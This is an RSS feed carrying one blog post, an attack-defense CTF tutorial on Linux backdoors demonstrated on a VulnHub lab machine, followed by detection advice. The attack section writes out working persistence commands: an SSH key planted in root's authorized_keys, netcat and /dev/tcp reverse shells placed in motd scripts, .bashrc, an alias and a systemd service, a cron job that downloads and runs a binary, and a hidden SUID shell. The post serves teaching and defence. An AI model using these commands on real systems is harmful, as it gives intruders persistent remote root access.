<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Security on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/security/</link>
    <description>Recent content in Security on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Tue, 25 May 2021 18:49:35 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Linux Backdoors and Where to Find Them</title>
      <link>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</link>
      <pubDate>Tue, 25 May 2021 18:49:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</guid>
      <description>Learn some backdoor techniques and how to deal with them!</description>
      <content:encoded><![CDATA[<p>[Updated 25-06-2021]</p>
<p>In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.</p>
<h2 id="backdoors-what-is-it">Backdoors, what is it?</h2>
<p>Well, I&rsquo;m not going to go into as much detail as <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">Wikipedia</a>, but here&rsquo;s:</p>
<p>A backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice. It simply gives you quicker and instant access to the system.</p>
<p>Now that we know what a backdoor is, let&rsquo;s find out where the attackers typically hide them in a <strong>Linux</strong> system. For demonstration, I’ll be using the <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">Pinky’s Palace</a> machine from VulnHub, and let’s pretend it has been compromised.</p>
<h3 id="1-ssh-keys">1. SSH keys</h3>
<p>SSH <a href="https://www.ssh.com/academy/ssh/authorized_keys/openssh">authorized_keys</a> file contains a list of authorized users/public keys that are allowed to login into a specific account. In this file, the attackers can also place their public keys to authorize themselves and get instant access to the system via SSH.</p>
<p>For example, below are the exploitation steps to gain root access on the target system (Pinky&rsquo;s Palace).</p>
<p><div class="img-container"><img src="imgs/image-20210526004056632.png" alt="image-20210526004056632"  /></div>
</p>
<p>Of course, as an attacker, I don’t want to repeat all those exploitation steps all over again.</p>
<p>So instead, on my attacking machine, I’ll generate a new pair of <a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">SSH keys</a> specialized for backdoor.</p>
<p><div class="img-container"><img src="imgs/image-20210526004747293.png" alt="image-20210526004747293"  /></div>
</p>
<p>And then, in this example, I can insert the newly generated public key (<code>backdoor_ssh.pub</code>) into the root  <code>authorized_keys</code> file of the compromised system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mkdir -p /root/.ssh/ <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali&#39;</span> &gt; /root/.ssh/authorized_keys
</code></pre></div><p>Now by specifying <code>backdoor_ssh</code> as the identity file (private key), I’m able to gain access on the compromised system via SSH.</p>
<p><div class="img-container"><img src="imgs/image-20210526005156382.png" alt="image-20210526005156382"  /></div>
</p>
<h3 id="2-ssh-motd">2. SSH motd</h3>
<p>This is one of the cool tricks I&rsquo;ve learned from HackTheBox machine called Traceback.</p>
<p><strong>Motd</strong> (Message of the day) is the banner that appears when you log into the machine using SSH. For Ubuntu/Debian <strong>motd</strong> can be found at <code>/etc/update-motd.d</code>. By default, other users don&rsquo;t have write permission on that directory.</p>
<p><div class="img-container"><img src="imgs/image-20210526010220513.png" alt="image-20210526010220513"  /></div>
</p>
<p>In the image above, there is only one <strong>motd</strong> script called <code>10-uname</code>.</p>
<p>As an attacker, I could place a new script there as a backdoor. For example, I&rsquo;ll put a netcat <a href="https://www.techslang.com/definition/what-is-a-reverse-shell/">reverse shell</a> script and name it as <code>20-backdoor</code> inside <code>/etc/update-motd.d/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:/etc/update-motd.d# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39;</span> &gt; 20-backdoor <span class="o">&amp;&amp;</span> chmod +x 20-backdoor
</code></pre></div><p>Then I&rsquo;ll login into the machine using a low privilege account named pinky.</p>
<p><div class="img-container"><img src="imgs/image-20210526010934360.png" alt="image-20210526010934360"  /></div>
</p>
<p>As you can see, that SSH login triggers my backdoor.</p>
<p>But wait, I logged in using pinky. How did I end up with a root shell?</p>
<p>Here is the <a href="http://manpages.ubuntu.com/manpages/xenial/en/man5/update-motd.5.htm">answer</a>:</p>
<blockquote>
<p>&hellip;</p>
<p>​       Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
​       each login,  and  this information is concatenated in /var/run/motd.  The order of script
​       execution is determined by the run-parts(8) &ndash;lsbsysinit  option  (basically  alphabetical
​       order, with a few caveats).</p>
<p>&hellip;</p>
</blockquote>
<h3 id="3-users-bashrc---interactive-session">3. User&rsquo;s .bashrc - Interactive session</h3>
<p><code>.bashrc</code> is one of the startup scripts used by Bourne shell aka <code>bash</code>. If there is a user who uses <code>bash</code> as their login shell, then this <code>.bashrc</code> will be executed for each interactive session they launch.</p>
<p>Here is some actions that triggers an interactive session:</p>
<p><div class="img-container"><img src="imgs/image-20210526005325944.png" alt="image-20210526005325944"  /></div>
</p>
<p>In the image above, I inserted a non malicious line script <code>echo &quot;I'm triggered&quot;</code> to my <code>.bashrc</code>. But now, as an attacker, I can put a reverse shell there, and I&rsquo;ll just wait for someone to log in to trigger it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pinky@pinkys-palace:~$ <span class="nb">echo</span> <span class="s1">&#39;nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;&#39;</span> &gt; .bashrc
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210525220025256.png" alt="image-20210525220025256"  /></div>
</p>
<p>In the image above, I switched from <code>root</code> to user <code>pinky</code> and put a reverse shell on pinky&rsquo;s <code>.bashrc</code> file. I exited pinky&rsquo;s shell and immediately switch again to user <code>pinky</code> to trigger an interactive session.</p>
<h3 id="4-users-bashrc---aliases">4. User&rsquo;s .bashrc - Aliases</h3>
<p>As an attacker, I can also put the backdoor in the users' aliases!</p>
<p>Here is an example of a <em>backdoored</em>  <code>cd</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:~# <span class="nb">alias</span> <span class="nv">cd</span><span class="o">=</span><span class="s1">&#39;$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd&#39;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526002305189.png" alt="image-20210526002305189"  /></div>
</p>
<p>Some other tricky backdoors using alias:</p>
<ul>
<li><a href="https://github.com/nisay759/sudo-backdoor">https://github.com/nisay759/sudo-backdoor</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
</ul>
<h3 id="5-cron-jobs">5. Cron jobs</h3>
<p>Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.</p>
<p>Here is an example of a backdoor using Cron job.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:~# <span class="nb">echo</span> <span class="s1">&#39;* * * * * root cd /tmp; wget 192.168.2.103/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor&#39;</span> &gt; /etc/cron.d/backdoor
</code></pre></div><p>What the task above does is it will download a malicious binary called &lsquo;backdoor&rsquo; which is hosted on my attacking machine, and the backdoor is then executed once every minute.</p>
<p><div class="img-container"><img src="imgs/image-20210625141344607.png" alt="image-20210625141344607"  /></div>
</p>
<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
<p>An attacker can also create a backdoor as a service (BaaS). Here is an example of BaaS in a single file (<code>backdoor.service</code>):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
[Install]
WantedBy=multi-user.target&#39;
</code></pre></div><p>When the service is started, it launches a reverse shell to the attacker.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526013637397.png" alt="image-20210526013637397"  /></div>
</p>
<p>It can be enabled on boot by issuing the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:/etc/systemd/system# systemctl <span class="nb">enable</span> backdoor.service
</code></pre></div><h3 id="7-suid">7. SUID</h3>
<p>The last one on this post is SUID.</p>
<p>As an example, I can make a copy of bash called <code>.backdoor</code> (notice the dot) to a low privilege user but has been compromised,  and then set SUID permission on it.</p>
<p><div class="img-container"><img src="imgs/image-20210526020936681.png" alt="image-20210526020936681"  /></div>
</p>
<p>Why do I add dot?</p>
<p>Well, this is based on my observation on some people out there. They tend to just use <code>ls -l</code> rather than <code>ls -la</code>, and this becomes an advantage for attackers to put a backdoor with a dot.</p>
<p>It’s not just about SUID though, it applies to other backdoors as well (*<em>cough</em>* and <code>.git</code> folder *<em>cough</em>*)</p>
<h2 id="blue-team-side">Blue Team side</h2>
<p>Before reading further, I’ll state that if your server (irl) gets hacked, it’s better to restore the server’s backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and combined with other techniques (not to mention there might be a rootkit too), making it difficult to detect/find.</p>
<p>Also what I share here might not be that effective, but here is how I usually deal with those backdoors in attack-defense CTF.</p>
<h3 id="ssh-keys-and-bashrc">SSH keys and .bashrc.</h3>
<p>Make sure to regularly check the all the users <code>authorized_keys</code> file.</p>
<p>In the image below, there is a public key with a foreign hostname <code>kali</code> instead of <code>pinkys-palace</code>, then we should suspect it.</p>
<p><div class="img-container"><img src="imgs/image-20210605091730851.png" alt="image-20210605091730851"  /></div>
</p>
<p>Well, actually, the attackers might have tricked it to look like it was a legitimate one.</p>
<p>My workaround here is why don’t we create a ‘skeleton’ file of all the <code>authorized_keys</code> files and set a Cronjob which automatically reverts those files back to its original state, and I might perform it remotely via <code>scp</code>. This can be applied as well to handle backdoor in <code>.bashrc</code> .</p>
<blockquote>
<p>You can find the skeleton file of <code>.bashrc</code> at <code>/etc/skel</code>.</p>
</blockquote>
<h3 id="ssh-motd">SSH motd</h3>
<p>It&rsquo;s not always placed on <code>/etc/update-motd.d</code>, but make sure the <strong>motd</strong> directory is only writable by root, note the default list of <strong>motd</strong> files and apply the same thing as above (skeleton file) because the attackers might have inserted a backdoor in the original files.</p>
<p>We could also do some &lsquo;forensics&rsquo; using timestamp:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@MSI:/etc/update-motd.d# ls --full-time
</code></pre></div><p>For example, those files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state.</p>
<p><div class="img-container"><img src="imgs/image-20210605092751344.png" alt="image-20210605092751344"  /></div>
</p>
<p>After inserting a non-malicious line, the timestamp changed. From here, it&rsquo;s safe to assume that someone/something has modified it.</p>
<p><div class="img-container"><img src="imgs/image-20210605093121574.png" alt="image-20210605093121574"  /></div>
</p>
<h3 id="cronjobs-and-services">Cronjobs and Services</h3>
<p>We can monitoring the process using  <code>netstat</code> and <code>ps</code> command. Anything that looks like a reverse shell or a bind shell is definitely suspicious.</p>
<p>To find an unwanted open port we can use this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ netstat -antp <span class="p">|</span> grep LISTEN
</code></pre></div><p>To find a suspicious  connection we can use this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ netstat -antp <span class="p">|</span> grep ESTABLISHED
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526034616621.png" alt="image-20210526034616621"  /></div>
</p>
<p>Sometimes the state of a reverse shell backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. This occurs when the backdoor fail to reach out the attacker.</p>
<p>To find that we can use the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ netstat -antp <span class="p">|</span> grep SYN_SENT
</code></pre></div><p>We could also check each user&rsquo;s crontab using the following command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>

<span class="c1"># Only users who have login shell</span>
$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> grep sh$ <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
</code></pre></div><p>There is also the <code>ps -f</code> command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on <code>.bashrc</code> file because it gets triggered every time we launch a bash shell (interactive session).</p>
<p><div class="img-container"><img src="imgs/image-20210526034217561.png" alt="image-20210526034217561"  /></div>
</p>
<p>If you prefer the detailed view, consider to use <code>ps auxfww</code> to show process tree with username, TTY, and a wide output.</p>
<h3 id="finding-suid">Finding SUID</h3>
<p>To find some suspicious SUID we can use the <code>find</code> commands. It can also detect the SUID that started with dot!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm <span class="m">4755</span> 2&gt;/dev/null
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526035623660.png" alt="image-20210526035623660"  /></div>
</p>
<p>So that&rsquo;s all for today.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.techslang.com/definition/what-is-a-reverse-shell/">https://www.techslang.com/definition/what-is-a-reverse-shell/</a></li>
<li><a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/">https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/</a></li>
<li><a href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c">https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
<li><a href="https://ippsec.rocks/?#">https://ippsec.rocks/?#</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
